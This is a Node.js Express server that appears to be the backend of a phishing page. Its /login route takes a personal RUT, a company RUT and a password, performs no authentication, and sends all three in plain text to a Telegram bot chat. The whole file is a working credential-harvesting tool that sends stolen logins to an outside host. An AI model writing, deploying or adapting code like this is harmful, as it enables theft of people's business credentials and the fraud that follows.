const express = require("express");
const path = require("path");
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Servir frontend desde /public
app.use(express.static(path.join(__dirname, "public")));

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

async function sendTelegramMessage(text) {
  const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
  const res = await fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: CHAT_ID, text })
  });
  if (!res.ok) {
    throw new Error(`Telegram API error: ${res.statusText}`);
  }
}

app.post("/login", async (req, res) => {
  const { rutPersona, rutEmpresa, passwd } = req.body;
  const mensaje = `🔔 Nuevo intento de login:\n👤 RUT Persona: ${rutPersona}\n🏢 RUT Empresa: ${rutEmpresa}\n🔑 Contraseña: ${passwd}`;

  try {
    await sendTelegramMessage(mensaje);
    res.send("✅ Notificación enviada a Telegram.");
  } catch (error) {
    console.error("Error enviando a Telegram:", error);
    res.status(500).send("❌ Error al notificar.");
  }
});

// Render usa PORT de entorno
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Servidor corriendo en http://localhost:${PORT}`));
